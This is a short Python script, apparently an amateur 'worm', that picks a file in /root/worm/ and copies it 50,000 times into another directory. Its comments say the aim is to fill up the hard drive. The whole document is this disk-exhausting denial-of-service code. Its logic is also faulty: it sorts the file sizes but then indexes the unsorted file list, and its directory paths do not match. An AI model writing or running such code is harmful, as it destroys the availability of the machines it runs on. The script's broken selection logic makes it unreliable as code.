
import shutil
import os

original_path1 = '/root/worm/'
original_path=r'/root/worm/copyme.txt'
target_path = r'/root/copyhere/copyme.txt'
#shutil.copyfile(original_path,target_path)
files_list = []
all_the_sizes = []

#Go to a directory check in that directory the largest file 
#then go to another directory and keep pasting that file to fill up the harddrive 
#This is the basic idea 


for file in os.listdir(original_path1):
    #if file == "worm.py":
        #continue
    files_list.append(file)
    

print(files_list)

 

if len(files_list) > 1:
    i = 0
    while(i < len(files_list)):
        size = os.path.getsize('/root/worm/{}'.format(files_list[i]))
        
        all_the_sizes.append(size)
        
        i = i + 1
    all_the_sizes.sort()    
    j = 0
    while(j < len(all_the_sizes)):
        #print(all_the_sizes[j])
        j = j + 1
    j = j - 1
    
    biggest_file = files_list[j]
    print(biggest_file)
    

else:
    size = os.path.getsize('/root/worm/{}'.format(files_list[0]))
    print(size)
    biggest_file = files_list[0]





spread = False
num = 0
while(num < 50000):
    
    final_path = "/root/worm/{}".format(biggest_file)
    final_destpath = "/root/copyme/hehe{}.txt".format(num)    
        
    
    shutil.copyfile(final_path,final_destpath)
    
    num = num + 1
    
       
    
   
